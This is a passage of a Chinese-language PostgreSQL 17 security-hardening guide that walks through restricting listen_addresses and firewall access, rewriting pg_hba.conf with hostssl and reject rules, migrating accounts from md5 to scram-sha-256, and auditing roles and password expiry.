---
title: "PostgreSQL 安全強化"
desc: "收斂 listen_addresses 與 pg_hba、md5 換 scram-sha-256、用自建 CA 強制 hostssl、收乾 PUBLIC 權限、以 pgaudit 建立稽核軌跡，並產出可交稽核的符合性報告"
aliases: [PostgreSQL hardening, pg_hba 安全, hostssl, scram-sha-256, pgaudit, pg-hardening-check]
tags: [群組/軟體與開發工具, 服務/postgresql, 安全/資料庫, 主題/稽核, 主題/個資保護]
category: 資料庫與資料儲存
difficulty: 專家
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[060-04-02-04-svc-PostgreSQL-設定檔與pg_hba]]", "[[060-04-02-02-cmd-PostgreSQL-角色與權限]]", "[[090-01-08-guide-PKI-用自建CA簽發伺服器憑證]]"]
updated: 2026-08-28
---

# PostgreSQL 安全強化

> [!abstract] 這篇你會學到
> - 從**外部主機**實際量出你的 PostgreSQL 到底對誰開放，分清楚「連不到」「連得到但被 pg_hba 拒絕」這兩件完全不同的事
> - ★★★★ 把 `listen_addresses` + 防火牆 + `pg_hba.conf` 三層一起收斂 —— PostgreSQL 的網路防線有一半寫在 `pg_hba.conf` 裡，這是它跟 MySQL 最大的差別
> - 把還在用 `md5` 的帳號**不中斷服務**地遷移到 `scram-sha-256`，並知道 `passwordcheck` 為什麼在 SCRAM 下幾乎失效
> - ★★★★ 用機關自建 CA 簽發資料庫憑證，分階段從 `host` 切到 `hostssl`，用 `pg_stat_ssl` 精準找出「還在裸連的是誰」
> - 收乾 `PUBLIC` 的殘留權限（`CONNECT`、PG 14 以前的 `public` schema `CREATE`），並封掉 `COPY … FROM PROGRAM` 這條直接拿 shell 的路
> - ★★★★ 用 `pgaudit` 建立**查得出「誰撈了哪張表」**的稽核軌跡 —— 這是 PostgreSQL 相對 MySQL 社群版最大的優勢
> - ★★★★★ 判斷「拿正式庫 dump 給測試環境／廠商」在個資法下是什麼性質，以及一支 `pg-hardening-check.sh` 怎麼產出整改前後對照表

## 前置知識

- [[060-04-02-04-svc-PostgreSQL-設定檔與pg_hba]] — ★★★★ **這篇是本篇的地基**。`pg_hba.conf` 的欄位語法、比對順序、reload 與 restart 的分界都在那裡，本篇只做「安全面該怎麼填」
- [[060-04-02-02-cmd-PostgreSQL-角色與權限]] — `CREATE ROLE` / `GRANT` / `ALTER DEFAULT PRIVILEGES` 的完整模型在那篇，本篇只做**盤點與收斂**
- [[090-01-08-guide-PKI-用自建CA簽發伺服器憑證]] — 本篇直接用機關內部 CA 簽出資料庫憑證，CA 的建置流程不在這裡重寫
- [[090-02-02-guide-防火牆-ufw基礎與實務]] — 防火牆語法引用該篇，本篇只講「5432 該放行給誰」
- [[020-02-01-05-cmd-SSH-隧道與埠轉發]] — 跨機管理資料庫的正確姿勢

> [!tip] 這篇刻意不重複的內容
> - **SQL 語法**（`GRANT`、`REVOKE`、`CREATE VIEW`）在 [[060-04-01-03-cmd-MySQL-SQL基礎操作]]，本篇只寫安全相關的用法與判讀。
> - 備份的排程、加密與**還原演練**在 [[060-04-02-05-svc-PostgreSQL-備份與還原]]；本篇只講「dump 檔本身是一份個資資產」這一面。
> - 複寫帳號與 `replication` 連線的建置在 [[060-04-02-07-svc-PostgreSQL-複寫與高可用]]；本篇補憑證面。
> - TWGCB 基準文件本身的解讀在 [[090-06-01-guide-TWGCB-TWGCB概念與法規要求]]。
> - Wazuh 規則怎麼寫在 [[090-08-05-guide-Wazuh-日誌蒐集與解析]]；本篇只講「要送什麼過去、要告警什麼」。

> [!info]- 跟 [[060-04-01-07-svc-MySQL-安全強化]] 對照著看
> 同一件事在兩套資料庫的做法差很多，這張表先建立心智模型：
>
> | 要做的事 | MySQL 8 | PostgreSQL 16/17 |
> | --- | --- | --- |
> | 限制誰連得到 | `bind-address` + 防火牆 + 帳號的 `host` 欄 | `listen_addresses` + 防火牆 + ★★★★ **`pg_hba.conf`** |
> | 認證規則放哪 | 散在 `mysql.user` 每一列 | 集中在一個檔案，**由上往下第一筆命中即定案** |
> | 密碼雜湊 | `caching_sha2_password`（8.0 預設） | `scram-sha-256`（14 起預設），舊機器常殘留 `md5` |
> | 強制加密連線 | `require_secure_transport=ON`（全域一刀切） | `hostssl` 逐條規則（★★★ 可以按網段分階段） |
> | 驗客戶端憑證 | `REQUIRE X509`（帳號屬性） | `clientcert=verify-ca` / `verify-full`（pg_hba 選項）或 `cert` 認證方法 |
> | 靜態加密 | InnoDB 表空間加密（內建） | ★★★★ **社群版沒有 TDE**，靠 LUKS + `pgcrypto` + 備份加密 |
> | 稽核日誌 | ❌ 社群版無官方外掛 | ✅ ★★★★ **pgaudit**（成熟的第三方擴充，PGDG 官方套件庫就有） |
> | 列級安全 | ❌ 只能靠 view | ✅ Row-Level Security（內建） |
>
> 一句話：**PostgreSQL 的網路與認證面更難設定但更精準，稽核面完勝，靜態加密面完敗。**

---

## 觀念說明

### 資料庫的攻擊面分層（PostgreSQL 版）

```text
┌───────────────────────────────────────────────────────────────────────┐
│ ① 網路層   誰的封包到得了 5432                                          │
│            listen_addresses、ufw/firewalld、SSH 隧道                    │ ← 收斂 CP 值最高
├───────────────────────────────────────────────────────────────────────┤
│ ② 准入層   ★★★★ pg_hba.conf ——「哪個來源、哪個帳號、哪個庫、用什麼方法」  │
│            PostgreSQL 獨有的一層，MySQL 沒有對應物                       │ ← 最容易寫錯
├───────────────────────────────────────────────────────────────────────┤
│ ③ 認證層   通過 pg_hba 之後，密碼怎麼驗                                  │
│            scram-sha-256、channel binding、VALID UNTIL、憑證認證         │
├───────────────────────────────────────────────────────────────────────┤
│ ④ 授權層   登入之後碰得到什麼                                            │
│            PUBLIC 殘留、schema 權限、預設權限、預定義角色、RLS            │
├───────────────────────────────────────────────────────────────────────┤
│ ⑤ 傳輸層   線上的封包能不能被看、伺服器能不能被冒充                       │
│            ssl=on、hostssl、sslmode=verify-full、clientcert              │ ← ★★★★ 最常「以為做了」
├───────────────────────────────────────────────────────────────────────┤
│ ⑥ 靜態層   磁碟被搬走 / dump 檔被複製時，資料還讀不讀得出來               │
│            ★★★★ 社群版無 TDE → LUKS + pgcrypto + 備份檔加密              │
├───────────────────────────────────────────────────────────────────────┤
│ ⑦ 稽核層   出事之後查不查得出「誰撈了什麼」                               │
│            log_connections、log_line_prefix、pgaudit、集中日誌與告警      │
├───────────────────────────────────────────────────────────────────────┤
│ ⑧ OS 層    postgres 這個行程被壓在多小的範圍裡                            │
│            資料目錄權限、AppArmor/SELinux、COPY FROM PROGRAM、擴充白名單   │
└───────────────────────────────────────────────────────────────────────┘
```

### ★★★★ 為什麼 PostgreSQL 特別容易「以為關了其實沒關」

MySQL 只要 `bind-address` 收好，網路面大概就穩了。PostgreSQL 有兩個開關，
**兩個都對才算對**：

```text
listen_addresses = '*'          pg_hba.conf 有 0.0.0.0/0     結果
─────────────────────────────────────────────────────────────────────────
     是                              是                  ★★★★★ 全網可嘗試登入
     是                              否                  埠開著、TCP 通、被 pg_hba 拒
                                                         → 攻擊者知道你是 PostgreSQL、
                                                            知道版本、可以耗連線
     否（localhost）                 是                  安全（但設定是顆地雷，
                                                            哪天有人改 listen 就爆）
     否                              否                  ★ 正確
```

> [!danger] ★★★★ 「`pg_hba` 有擋」不等於安全
> 被 `pg_hba.conf` 拒絕的連線，是在 **TCP 三次握手完成、PostgreSQL 已經跟對方講過話之後**才被拒的。
> 攻擊者此時已經拿到：
> - 你在跑 PostgreSQL 這個事實（服務指紋）
> - 錯誤訊息裡的**資料庫名稱與帳號名稱**是否存在的線索
> - 一條可以反覆重試、消耗 `max_connections` 的通道
>
> 正確的目標是：外部掃描應該看到 **filtered（逾時）**，不是 `open`。

### pg_hba.conf 是「第一筆命中即定案」

官方文件寫得很清楚：**沒有 fall-through，沒有備援。**

```text
# 由上往下逐行比對 (type, address, database, user) 四個條件
# 第一筆全部命中的規則就決定用什麼認證方法 —— 就算那個方法驗失敗，也不會往下找

local   all   postgres            peer            ← ① 命中就用 peer，失敗直接 FATAL
host    all   all    127.0.0.1/32 trust           ← ② ★★★★★ 這行在上面，下面全白寫
hostssl appdb app_rw 10.10.20.0/24 scram-sha-256  ← ③ 永遠輪不到（若來源是 127.0.0.1）
```

★★★★ 這個「第一筆命中」的特性，同時是它最強與最危險的地方：
**你新增的嚴格規則如果放在寬鬆規則下面，等於沒寫。**
比對順序的完整說明見 [[060-04-02-04-svc-PostgreSQL-設定檔與pg_hba]]，本篇只強調安全後果。

### 社群版做得到什麼、做不到什麼

| 能力 | PostgreSQL 16/17 社群版 | 備註 |
| --- | --- | --- |
| TLS 傳輸加密 + 驗客戶端憑證 | ✅ 內建完整 | `hostssl` + `clientcert=verify-full` |
| SCRAM 密碼雜湊 + channel binding | ✅ 內建 | ★★★ channel binding 需客戶端支援 |
| **稽核日誌（誰查了哪張表）** | ✅ ★★★★ **pgaudit** | 第三方擴充，PGDG 套件庫提供 |
| 列級安全（RLS） | ✅ 內建 | ★★★ superuser 與 `BYPASSRLS` 會繞過 |
| 欄位級權限 | ✅ 內建 | `GRANT SELECT (col1, col2) ON …` |
| **透明資料加密（TDE）** | ❌ **沒有** | ★★★★ 靠 LUKS 全碟加密 + 備份加密替代 |
| 欄位加密 | ⚠️ `pgcrypto`（應用層） | ★★★ 金鑰若寫在 SQL 會進日誌 |
| 密碼複雜度政策 | ⚠️ `passwordcheck` 幾乎失效 | ★★★★ 見下方「密碼政策的現實」 |
| 資料遮罩 / 去識別化 | ⚠️ 靠 view + 自寫函式 | 有第三方擴充但需自行評估 |

> [!warning] ★★★★ 「資料庫應具備稽核功能」這一條，PostgreSQL 答得出來
> 機關採購規格常寫這句話。MySQL 社群版只能寫替代方案；PostgreSQL 可以直接寫
> **pgaudit**，而且能做到「object audit logging」—— 只稽核你指定的敏感表。
> 這是選型時值得寫進評估表的一項。

---

## 環境準備與現況盤點

動任何設定之前，先把**現況**量出來。沒有整改前的基線，稽核回覆表就寫不出「整改前 / 整改後」。

以下主線環境：**Ubuntu 24.04 + PostgreSQL 17（PGDG 套件庫）**，叢集名 `17/main`。
版本與套件庫來源見 [[060-04-02-01-svc-PostgreSQL-安裝與初始化]]。

### 先確認你在操作哪個叢集

Debian 系可以同時裝多版本多叢集，★★★ **改錯叢集的設定檔是最常見的浪費時間來源**：

```bash
pg_lsclusters
```

預期輸出：

```text
Ver Cluster Port Status Owner    Data directory              Log file
17  main    5432 online postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
```

★★★ 記住這三個路徑，後面全部會用到：

```bash
sudo -u postgres psql -Atc "SHOW config_file; SHOW hba_file; SHOW data_directory;"
```

預期輸出：

```text
/etc/postgresql/17/main/postgresql.conf
/etc/postgresql/17/main/pg_hba.conf
/var/lib/postgresql/17/main
```

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> ```bash
> sudo -u postgres psql -Atc "SHOW config_file;"
> ```
>
> ```text
> /var/lib/pgsql/17/data/postgresql.conf
> ```
>
> ★★★★ RHEL 系的差異，每一條都會咬人：
> - 設定檔**在資料目錄裡**（`/var/lib/pgsql/17/data/`），不是 `/etc/`
> - 服務名是 `postgresql-17`，不是 `postgresql@17-main`
> - 沒有 `pg_lsclusters` / `pg_ctlcluster`，用 `systemctl` 與 `/usr/pgsql-17/bin/pg_ctl`
> - `logging_collector` 預設 **on**，日誌在 `/var/lib/pgsql/17/data/log/`
> - ★★★★ 多一層 **SELinux**：憑證放到 `/etc/pki/` 以外的路徑會被擋，見 [[090-02-07-guide-防護-SELinux與AppArmor]]
> - 防火牆用 `firewalld`（[[090-02-04-guide-防火牆-firewalld]]），不是 `ufw`

### ★★★★★ 第一步：你的資料庫在不在網路上

先在**資料庫主機本機**看監聽狀態：

```bash
sudo ss -lntp | grep -E 'postgres|5432'
```

**危險**的輸出長這樣：

```text
LISTEN 0 200 0.0.0.0:5432 0.0.0.0:* users:(("postgres",pid=1341,fd=6))   # ★★★★★ 所有 IPv4 介面
LISTEN 0 200    [::]:5432    [::]:* users:(("postgres",pid=1341,fd=7))   # ★★★★ IPv6 也別忘了
```

**安全**的輸出長這樣：

```text
LISTEN 0 200 127.0.0.1:5432   0.0.0.0:* users:(("postgres",pid=1341,fd=6))
LISTEN 0 200 10.10.20.11:5432 0.0.0.0:* users:(("postgres",pid=1341,fd=7))   # ★ 只綁內網介面
```

> [!warning] ★★★★ IPv6 幾乎每次都被忘記
> `listen_addresses = '*'` 同時綁 IPv4 與 IPv6。你的 `ufw` 規則如果只寫了 IPv4，
> 而機房環境有 IPv6 RA，那條 `[::]:5432` 就是一扇沒鎖的門。
> 檢查 `/etc/default/ufw` 的 `IPV6=yes`，並用 `sudo ufw status verbose` 確認有 `(v6)` 的對應規則。

### 從外部主機驗證（這一步不能省）

本機看到的是「綁在哪」，外部看到的才是「連不連得到」。
★★★ **只掃你自己機關的 IP，而且依機關規定事前取得書面同意**。

```bash
# 在另一台主機（例如辦公網段的維運筆電）執行
nmap -Pn -p 5432 db01.example.gov.tw
```

**收好了**的預期輸出：

```text
PORT     STATE    SERVICE
5432/tcp filtered postgresql        # ★ filtered = 封包被防火牆吃掉，這才是正確答案
```

**沒收好**的輸出：

```text
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 17.4 or later   # ★★★★★ 版本都被讀出來了
```

再用真的客戶端試一次，這比 `nmap` 更有說服力：

```bash
PGCONNECT_TIMEOUT=5 psql -h db01.example.gov.tw -U postgres -d postgres -c "SELECT 1"
```

| 你看到的訊息 | 代表什麼 | 星級 |
| --- | --- | --- |
| `psql: error: connection to server … failed: Connection timed out` | 防火牆吃掉封包，**這是你要的** | ★ |
| `… failed: Connection refused` | 埠沒人聽（或被 REJECT），也可以接受 | ★ |
| `FATAL: no pg_hba.conf entry for host "10.20.1.5", user "postgres", database "postgres", no encryption` | ★★★★ **埠是通的**，只是 pg_hba 擋了 —— 撐住你的是設定檔，不是網路 | ★★★★ |
| `FATAL: password authentication failed for user "postgres"` | ★★★★★ **pg_hba 放行了這個來源**，只差密碼 —— 攻擊者可以慢慢猜 | ★★★★★ |
| `FATAL: database "postgres" does not exist` | ★★★★ 認證**已經通過**了，只是庫名錯 —— 代表對方拿到有效憑證 | ★★★★★ |

> [!danger] ★★★★ `no pg_hba.conf entry` 不是「安全」
> 很多人看到這行就安心了。實際上它代表 **TCP 握手成功、PostgreSQL 願意跟你講話**。
> 而且這行錯誤訊息還**主動告訴攻擊者**：伺服器認得 `postgres` 這個帳號名、
> `postgres` 這個資料庫名，以及「你沒用加密」（`no encryption` 那段）。
> **正確答案只有逾時或連線被拒。**

### 盤點 pg_hba.conf 的現況

不要用肉眼讀檔案 —— 用**伺服器自己解析後的結果**，這樣連 `include` 進來的檔案也看得到：

```bash
sudo -u postgres psql -x -c "
SELECT rule_number, file_name, line_number, type, database, user_name,
       address, auth_method, options, error
FROM pg_hba_file_rules
ORDER BY rule_number;"
```

預期輸出（節錄）：

```text
-[ RECORD 3 ]------------------------------
rule_number | 3
file_name   | /etc/postgresql/17/main/pg_hba.conf
line_number | 117
type        | host
database    | {all}
user_name   | {all}
address     | 0.0.0.0
auth_method | md5                          -- ★★★★★ 兩個紅燈同時亮
options     |
error       |
```

★★★★ `error` 欄不是 NULL，代表那一行**根本沒被載入**（語法錯）。
先用一行指令抓出所有紅燈：

```bash
sudo -u postgres psql -Atc "
SELECT line_number || ' | ' || type || ' | ' || auth_method || ' | ' || coalesce(address,'-')
FROM pg_hba_file_rules
WHERE error IS NOT NULL
   OR auth_method IN ('trust','password','md5','ident')
   OR address IN ('0.0.0.0','::','all');"
```

預期輸出（有問題時）：

```text
92 | host | trust | 0.0.0.0            -- ★★★★★ 免密碼 + 全網
117 | host | md5 | 0.0.0.0             -- ★★★★★ 弱雜湊 + 全網
124 | host | password | 10.10.20.0/24  -- ★★★★★ password = 明文傳密碼
```

★★★★★ 沒有輸出才是好消息。

| pg_hba 認證方法 | 風險 | 該怎麼辦 |
| --- | --- | --- |
| ★★★★★ `trust` | 任何連得到的人都能登入成任何帳號，**完全免密碼** | 立刻改掉。唯一可接受的例外是 `local` + 單機救援情境 |
| ★★★★★ `password` | 密碼**明文**送過網路 | 改 `scram-sha-256` |
| ★★★★ `md5` | 雜湊可被離線破解，PG 18 已標記為 deprecated | 遷移至 `scram-sha-256`（本篇有完整流程） |
| ★★★ `ident` | 依賴遠端 identd，可被偽造 | TCP 連線改 `scram-sha-256` |
| ★★ `peer` | 只能用於 `local`，靠 OS 帳號 | ✅ 適合 `local all postgres peer` |
| ★ `scram-sha-256` | 目前的正解 | ✅ |
| ★ `cert` | 純憑證認證，隱含 `hostssl` | ✅ 適合機器對機器（複寫、備份主機） |
| ★ `reject` | 明確拒絕，可用來擋在寬鬆規則之前 | ✅ 善用它做「黑名單優先」 |

### 盤點帳號與密碼雜湊

★★★★ 這一段的輸出，就是你的「整改前基線」，請存檔：

```bash
sudo -u postgres psql -c "
SELECT r.rolname,
       r.rolsuper AS super, r.rolcreaterole AS crole, r.rolcreatedb AS cdb,
       r.rolreplication AS repl, r.rolbypassrls AS bypassrls,
       r.rolcanlogin AS login, r.rolconnlimit AS connlim,
       CASE WHEN r.rolpassword IS NULL THEN '(無密碼)'
            WHEN r.rolpassword LIKE 'SCRAM-SHA-256%' THEN 'scram'
            WHEN r.rolpassword LIKE 'md5%' THEN 'MD5 ★★★★'
            ELSE '其他' END AS pw,
       r.rolvaliduntil AS valid_until
FROM pg_authid r
WHERE r.rolname NOT LIKE 'pg\_%'
ORDER BY r.rolsuper DESC, r.rolname;"
```

預期輸出：

```text
   rolname   | super | crole | cdb  | repl | bypassrls | login | connlim |    pw     |      valid_until
-------------+-------+-------+------+------+-----------+-------+---------+-----------+------------------------
 postgres    | t     | t     | t    | t    | t         | t     |      -1 | scram     |
 legacy_root | t     | t     | t    | f    | f         | t     |      -1 | MD5 ★★★★ |               ← ★★★★★ 前廠商留的
 app_rw      | f     | f     | f    | f    | f         | t     |      -1 | scram     |
 rep_user    | f     | f     | f    | t    | f         | t     |      -1 | MD5 ★★★★ |               ← ★★★★ 複寫帳號
 report_ro   | f     | f     | f    | f    | f         | t     |      -1 | (無密碼)  |               ← ★★★★★ 沒密碼
```

★★★★ `rolpassword` 只有 superuser 讀得到 `pg_authid`（`pg_shadow` 同理），
一般帳號查 `pg_roles` 看到的是 `********`。

**四類必須處理的帳號**：

| 類別 | 怎麼找 | 處置 |
| --- | --- | --- |
| ★★★★★ 沒有密碼卻能登入 | `rolcanlogin AND rolpassword IS NULL` | 立刻 `ALTER ROLE … NOLOGIN` 或設密碼；若 pg_hba 有 `trust`，這帳號是完全開放的 |
| ★★★★★ 不必要的 superuser | `rolsuper AND rolname <> 'postgres'` | 降權為一般 role + 需要的預定義角色 |
| ★★★★ 還在 md5 | `rolpassword LIKE 'md5%'` | 走下方 SCRAM 遷移流程 |
| ★★★★ 離職者／前廠商帳號 | 對照人事名冊與委外契約 | `REASSIGN OWNED` → `DROP OWNED` → `DROP ROLE`（★★★ 順序不能反，見 [[060-04-02-02-cmd-PostgreSQL-角色與權限]]） |

---

## 進階設定與調校

### ★★★★ 收斂第一層：listen_addresses 與防火牆

改設定檔。★★★ 建議寫進 drop-in，不要直接編輯主檔（升級時較不會衝突）：

```bash
sudo tee /etc/postgresql/17/main/conf.d/50-hardening.conf > /dev/null <<'EOF'
# ★★★★ 只綁 loopback 與內網介面，不要用 '*'
listen_addresses = 'localhost,10.10.20.11'
port = 5432

# ★★★ 認證握手逾時，縮短可降低慢速連線耗盡連線槽的風險
authentication_timeout = 30s

# ★★★★ 預留給 superuser 的連線槽 —— 出事時你還進得去
superuser_reserved_connections = 3
EOF
```

★★★★ `listen_addresses` 是 **postmaster** 參數，**只能重啟生效**，reload 沒有用：

```bash
sudo systemctl restart postgresql@17-main
sudo ss -lntp | grep 5432
```

預期輸出：

```text
LISTEN 0 200 127.0.0.1:5432   0.0.0.0:* users:(("postgres",pid=2210,fd=6))
LISTEN 0 200 10.10.20.11:5432 0.0.0.0:* users:(("postgres",pid=2210,fd=7))
```

★★★★★ `[::]:5432` 消失了才算數。

防火牆白名單（語法細節見 [[090-02-02-guide-防火牆-ufw基礎與實務]]）：

```bash
# ★★★★★ 絕對不要寫 `sudo ufw allow 5432/tcp` —— 那是對全世界開放
sudo ufw allow from 10.10.20.21 to any port 5432 proto tcp comment 'app01 -> pg'
sudo ufw allow from 10.10.20.22 to any port 5432 proto tcp comment 'app02 -> pg'
sudo ufw status numbered | grep 5432
```

預期輸出：

```text
[ 5] 5432/tcp                   ALLOW IN    10.10.20.21   # app01 -> pg
[ 6] 5432/tcp                   ALLOW IN    10.10.20.22   # app02 -> pg
```

★★★★★ 看到 `Anywhere` 就是紅燈，立刻 `sudo ufw delete <編號>`。

> [!tip] ★★★ 維運人員不要開防火牆規則給自己
> 你要用 psql 連正式庫，走 SSH 隧道，不要在防火牆上留一條「維運筆電」的規則
> （筆電 IP 會變、會被帶出機關、會遺失）：
>
> ```bash
> ssh -N -L 15432:127.0.0.1:5432 ops@db01.example.gov.tw
> psql -h 127.0.0.1 -p 15432 -U app_rw appdb
> ```
>
> 完整做法見 [[020-02-01-05-cmd-SSH-隧道與埠轉發]]。

### ★★★★ 收斂第二層：重寫 pg_hba.conf

這是 PostgreSQL 安全強化的**主戰場**。原則只有四條：

1. **由嚴到寬**排序，把 `reject` 放最前面
2. **不寫 `all`** —— 資料庫、帳號、來源網段都要指名
3. TCP 一律 `hostssl`，並保留一條 `hostnossl … reject` 讓錯誤訊息明確
4. `local` 只留 `postgres` 的 `peer`

一份可以直接抄的骨架：

```text
# TYPE      DATABASE   USER          ADDRESS           METHOD           OPTIONS
# ── ① 本機維運（不走網路，最安全）─────────────────────────────
local       all        postgres                        peer
local       appdb      app_rw                          scram-sha-256

# ── ② 明確黑名單放最前面（★★★★ 第一筆命中即定案，順序就是規則）──
hostnossl   all        all           0.0.0.0/0         reject
hostnossl   all        all           ::/0              reject

# ── ③ 應用伺服器：指名庫、指名帳號、指名主機 ──────────────────
hostssl     appdb      app_rw        10.10.20.21/32    scram-sha-256
hostssl     appdb      app_rw        10.10.20.22/32    scram-sha-256

# ── ④ 唯讀報表帳號：只給報表主機 ─────────────────────────────
hostssl     appdb      report_ro     10.10.30.15/32    scram-sha-256

# ── ⑤ 複寫：用客戶端憑證，不用密碼（★★★ 機器對機器的正解）────
hostssl     replication rep_user     10.10.20.12/32    cert             clientcert=verify-full

# ── ⑥ 監控：只給 pg_monitor 角色，限來源 ─────────────────────
hostssl     postgres   mon_ro        10.10.40.9/32     scram-sha-256

# ── ⑦ 兜底：以上都沒命中就明確拒絕（★★ 讓意圖寫在檔案裡）─────
host        all        all           0.0.0.0/0         reject
host        all        all           ::/0              reject
```

各欄位語法與 `include_dir` 用法見 [[060-04-02-04-svc-PostgreSQL-設定檔與pg_hba]]。

★★★★★ **改完先驗證再套用**。順序反了會把自己鎖在門外：

```bash
# 【驗證 1】語法檢查：先 reload，再看有沒有 error
sudo systemctl reload postgresql@17-main
sudo -u postgres psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL;"
```

預期輸出：

```text
0
```

★★★★ 不是 0 的話，**PostgreSQL 會保留舊的規則繼續跑**（reload 失敗不會中斷服務），
日誌會寫 `configuration file "…pg_hba.conf" contains errors; no changes were applied`。
這是好事，代表你有時間修，但**千萬不要以為新規則生效了**。

```bash
# 【驗證 2】從應用主機實測（★★★★ 這一步不能只在本機做）
PGCONNECT_TIMEOUT=5 psql "host=db01.example.gov.tw dbname=appdb user=app_rw sslmode=require" -c "SELECT 1"
```

> [!warning] ★★★★ reload 還是 restart？
> | 你改了什麼 | 需要 |
> | --- | --- |
> | `pg_hba.conf` / `pg_ident.conf` | ★ **reload** |
> | `ssl`、`ssl_cert_file`、`ssl_ca_file`、`ssl_crl_file` | ★ **reload**（憑證輪替不必停機） |
> | `log_*`、`password_encryption`、`authentication_timeout` | ★ **reload** |
> | `listen_addresses`、`port`、`shared_preload_libraries` | ★★★★ **restart**（pgaudit 就卡在這） |
>
> 判斷方式不必背，直接問伺服器：
> ```bash
> sudo -u postgres psql -Atc "SELECT name, context FROM pg_settings WHERE name IN ('ssl','listen_addresses','shared_preload_libraries','password_encryption');"
> ```
> ```text
> listen_addresses|postmaster        # ★★★★ postmaster = 一定要重啟
> password_encryption|user
> shared_preload_libraries|postmaster
> ssl|sighup                         # ★ sighup = reload 就夠
> ```

### ★★★★ 收斂第三層：md5 遷移到 scram-sha-256

PostgreSQL 14 起 `password_encryption` 預設就是 `scram-sha-256`，
但**從舊版升上來的叢集**會保留 `md5`，而且**既有帳號的密碼不會自動轉換**。

> [!warning] ★★★★ PostgreSQL 18 已把 md5 標記為 deprecated
> 官方公告的淘汰路線是：v18 起 `CREATE ROLE` / `ALTER ROLE` 設定 md5 密碼會發出
> deprecation 警告，後續版本會逐步停止新建、停止認證、最終完全移除。
> ★★★ **現在遷移是選擇，過幾個大版本就會是強制。**

遷移的關鍵在於「換雜湊 = 換密碼」，所以要**分四步、可回頭**：

**步驟 1：確認目前設定與名單**

```bash
sudo -u postgres psql -Atc "SHOW password_encryption;"
sudo -u postgres psql -Atc "SELECT rolname FROM pg_authid WHERE rolpassword LIKE 'md5%';"
```

預期輸出：

```text
md5
legacy_root
rep_user
```

**步驟 2：把預設雜湊改成 scram（★★★ 這一步不影響既有密碼）**

```bash
sudo -u postgres psql -c "ALTER SYSTEM SET password_encryption = 'scram-sha-256';"
sudo systemctl reload postgresql@17-main
sudo -u postgres psql -Atc "SHOW password_encryption;"
```

預期輸出：

```text
scram-sha-256
```

> [!danger] ★★★★ `ALTER SYSTEM` 寫的是 `postgresql.auto.conf`，優先權**最高**
> 它會蓋掉你在 `postgresql.conf` 與 `conf.d/*.conf` 裡寫的同名參數。
> 半年後有人改了 `conf.d/50-hardening.conf` 卻沒生效，八成就是這個原因。
> 排查：
> ```bash
> sudo -u postgres psql -x -c "SELECT name, setting, source, sourcefile, sourceline FROM pg_settings WHERE name='password_encryption';"
> ```
> ```text
> source     | configuration file
> sourcefile | /var/lib/postgresql/17/main/postgresql.auto.conf   # ★★★★ 就是它
> ```
> ★★★ 團隊要選一種管理方式（全走 `ALTER SYSTEM`，或全走 `conf.d/`），不要混用。

**步驟 3：pg_hba 先改成「兩種都收」**

★★★★★ 不要一次改成只收 scram，會把還沒換密碼的帳號全部鎖死。
PostgreSQL 的 `md5` 方法有一個很實用的性質：**帳號密碼若已是 SCRAM 雜湊，
`md5` 規則會自動改用 SCRAM 驗證**。所以過渡期就是——

```text
# 過渡期：先維持 md5 這個「相容」方法，讓兩種雜湊都能登入
hostssl     appdb      app_rw        10.10.20.21/32    md5
```

**步驟 4：逐一重設密碼，然後才收緊**

```bash
# ★★★ 用 psql 的 \password，密碼不會進 shell history、不會進伺服器日誌
sudo -u postgres psql -c "\password legacy_root"
```

★★★★ 每換一個就驗證一次：

```bash
sudo -u postgres psql -Atc "
SELECT rolname, left(rolpassword, 14) AS hash_prefix
FROM pg_authid WHERE rolcanlogin AND rolpassword IS NOT NULL ORDER BY 1;"
```

預期輸出（全部換完）：

```text
app_rw|SCRAM-SHA-256$
legacy_root|SCRAM-SHA-256$
rep_user|SCRAM-SHA-256$
report_ro|SCRAM-SHA-256$
```

★★★★★ 確認**沒有任何一列**是 `md5` 開頭，才把 pg_hba 的 `md5` 全部改成 `scram-sha-256`
並 reload。

> [!tip] ★★★ 開啟 channel binding，擋住「假伺服器轉送」攻擊
> SCRAM-SHA-256 支援 channel binding：把 TLS 通道綁進認證流程，
> 中間人就算架了假伺服器也**無法把你的認證轉送給真伺服器**。
> 客戶端加上：
> ```bash
> psql "host=db01.example.gov.tw dbname=appdb user=app_rw sslmode=verify-full channel_binding=require"
> ```
> ★★★ 這是**客戶端**參數，伺服器端不能強制；請寫進應用的連線字串與部署文件。

### 密碼政策的現實（★★★★ 別在這裡浪費時間）

| 你想做的 | PostgreSQL 的實況 |
| --- | --- |
| 密碼複雜度檢查 | ★★★★ `passwordcheck` 模組**幾乎失效**：psql 的 `\password` 與大多數客戶端會在**客戶端**先算好 SCRAM 雜湊再送出，伺服器收到的是雜湊，檢查不了明文 |
| 密碼有效期 | ✅ `ALTER ROLE x VALID UNTIL '2027-01-01'` —— ★★★★ 但**到期就直接不能登入**，沒有寬限期 |
| 登入失敗鎖定 | ❌ 內建沒有。★★★ 靠 `log_connections` + fail2ban / Wazuh 主動封鎖 |
| 密碼歷史 | ❌ 內建沒有 |

```bash
# ★★★★ VALID UNTIL 只給「人用」帳號，千萬不要給應用帳號
sudo -u postgres psql -c "ALTER ROLE ops_alice VALID UNTIL '2026-11-30';"
sudo -u postgres psql -c "ALTER ROLE app_rw VALID UNTIL 'infinity';"
```

```bash
# 每月巡檢：30 天內到期的帳號
sudo -u postgres psql -c "
SELECT rolname, rolvaliduntil FROM pg_authid
WHERE rolvaliduntil IS NOT NULL AND rolvaliduntil < now() + interval '30 days'
ORDER BY rolvaliduntil;"
```

預期輸出：

```text
  rolname   |     rolvaliduntil
------------+------------------------
 ops_alice  | 2026-09-14 00:00:00+08     -- ★★★ 提前通知，不要等到當天
```

> [!danger] ★★★★★ 應用帳號設 VALID UNTIL 的下場
> 到期的那一刻，**所有應用同時**收到
> `FATAL: password authentication failed for user "app_rw"`，
> 而且錯誤訊息跟「密碼打錯」一模一樣 —— 半夜排查時很容易往錯的方向查。
> 應用帳號的密碼輪替要走「新增新帳號 → 應用切換 → 停用舊帳號」，不是靠到期日。

### ★★★★ 傳輸加密：從「有加密」到「真的安全」

**先看你現在到底有沒有開**：

```bash
sudo -u postgres psql -c "SHOW ssl;"
sudo -u postgres psql -x -c "
SELECT a.usename, a.client_addr, a.application_name,
